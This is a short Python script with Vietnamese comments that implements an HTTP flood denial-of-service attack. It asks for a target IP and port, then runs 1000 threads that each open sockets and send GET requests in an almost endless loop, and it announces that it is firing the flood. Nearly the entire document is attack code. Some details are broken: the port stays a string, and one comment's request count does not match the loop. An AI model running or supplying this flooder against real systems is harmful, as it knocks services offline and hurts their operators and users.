import socket
import random
import threading
import sys

target_ip = input("IP (ex: 0.0.0.0): ")
#target_ip = "0.0.0.0"
#terminal python -m http.server 80
target_port = input("port?: ")
a = 0

# Nội dung gói tin HTTP gửi liên tục để ép Server phải xử lý
request_packet = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".encode('utf-8')

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Gửi liên tục 100 request trên cùng 1 kết nối trước khi đóng
            for _ in range(99999999999999999):
                s.send(request_packet)
            s.close()
        except socket.error:
            pass

print(f"[*] Khai hỏa HTTP Flood vào {target_ip}:{target_port}...")
# Chạy 1000 luồng (Threads) song song để tăng sức mạnh dập dữ liệu
for i in range(1000):
    a=a+1
    print(a)
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# Giữ script chạy vô hạn
while True:
    pass
